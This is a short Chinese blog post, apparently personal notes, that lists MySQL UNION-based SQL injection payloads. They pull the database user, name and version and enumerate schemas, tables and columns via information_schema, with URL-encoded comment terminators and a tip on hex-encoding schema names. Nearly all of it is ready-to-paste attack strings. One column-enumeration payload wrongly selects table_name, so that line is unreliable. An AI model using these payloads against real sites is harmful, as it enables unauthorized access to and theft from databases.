---
title: 查询重要数据的sql语句
date: 2018-10-14 18:13:10
tags:
  - sql
---


查询用户名，数据库名，数据库版本信息：

```sql
union select 1,2,(concat_ws(char(32,58,32),user(),database(),version())) %23
```

查询所有数据库名

```sql
union select 1,schema_name from information_schema.schemata
```

查询一个库中所有的表的名字

```sql
union select group_concat(char(32),table_name,char(32)) from information_schema.tables   where table_schema=0x7365637572697479  %23
```

注意。在系统自带的表中查东西，where后面的值应该是单引号包裹或者16进制编码，通常用16进制

```sql
union select 1,table_name from information_schema.tables where table_schema='my_db'
```

查询一个表中所有列的名字

```sql
union select group_concat(char(32),table_name,char(32)) from information_schema.COLUMNS   where table_schema=0x7365637572697479  %23

union select 1,column_name from information_schema.columns where table_schema='my_db'
```
